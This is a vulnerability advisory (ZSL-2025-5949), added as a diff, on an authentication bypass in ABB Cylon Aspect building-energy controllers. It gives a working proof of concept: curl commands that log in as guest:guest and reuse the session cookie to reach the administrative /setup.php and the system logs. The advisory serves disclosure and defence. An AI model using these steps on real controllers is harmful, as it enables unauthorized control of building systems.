@@ -1,0 +1,123 @@
+
+ABB Cylon Aspect 3.08.03 (login.php) Obscure Authentication Bypass
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb
+Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
+                  Firmware: <=3.08.03
+
+Summary: ASPECT is an award-winning scalable building energy management
+and control solution designed to allow users seamless access to their
+building data through standard building protocols including smart devices.
+
+Desc: The ABB Cylon Aspect BAS controller allows login using guest:guest,
+which initiates a web session but restricts access to administrative features
+by returning an 'Invalid Admin Username and/or Password' message. However,
+the session is still active and valid within the HMI environment. Despite
+failed privilege validation in the login flow, direct navigation to /setup.php
+bypasses authentication and authorization controls entirely. This endpoint
+serves as the administrative dashboard and allows full configuration access,
+including the ability to change credentials for the privileged aamuser account.
+This flaw results in privilege escalation from a limited guest session to
+full administrative control, compromising the integrity of the system.
+
+Tested on: GNU/Linux 3.15.10 (armv7l)
+           GNU/Linux 3.10.0 (x86_64)
+           GNU/Linux 2.6.32 (x86_64)
+           Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+           Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+           PHP/7.3.11
+           PHP/5.6.30
+           PHP/5.4.16
+           PHP/4.4.8
+           PHP/5.3.3
+           AspectFT Automation Application Server
+           lighttpd/1.4.32
+           lighttpd/1.4.18
+           Apache/2.2.15 (CentOS)
+           OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64)
+           OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
+           ErgoTech MIX Deployment Server 2.0.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5949
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5949.php
+
+
+21.04.2024
+
+--
+
+
+$ cat project
+
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                                                            
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░                                               
+                                                                                                               
+
+$ curl http://192.168.73.31/validate/login.php \
+> -d "f_user=guest&f_pass=guest&submit=Login"
+
+HTTP/1.1 302 Found
+Date: Wed, 21 May 2025 20:11:17 GMT
+Server: Apache
+Set-Cookie: PHPSESSID=1ii8m7g2qb8c6lph0fu6olh0o0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: ../index.php?error=Invalid Admin Username and/or Password.
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+$ curl http://192.168.73.31/setup.php \
+> -H "Cookie: PHPSESSID=1ii8m7g2qb8c6lph0fu6olh0o0; cod=82; csd=86"
+
+HTTP/1.1 200 OK
+Date: Wed, 21 May 2025 20:12:16 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: context1=dHV2ZnVoZnRodjY7NjszOw%3D%3D; expires=Wed, 21-May-2025 21:12:16 GMT; path=/
+Set-Cookie: context1=dHV2ZnVoZnRodjY7NjszOw%3D%3D; expires=Wed, 21-May-2025 21:12:16 GMT; path=/
+Content-Length: 381
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+$ curl http://192.168.73.31/logSystem.php \
+> -H "Cookie: PHPSESSID=1ii8m7g2qb8c6lph0fu6olh0o0; context1=dHV2ZnVoZnRodjY7NjszOw%3D%3D; cod=82; csd=86"
+
+<html>
+    <head>
+        <title>System Logs</title>
+...
+...
+...
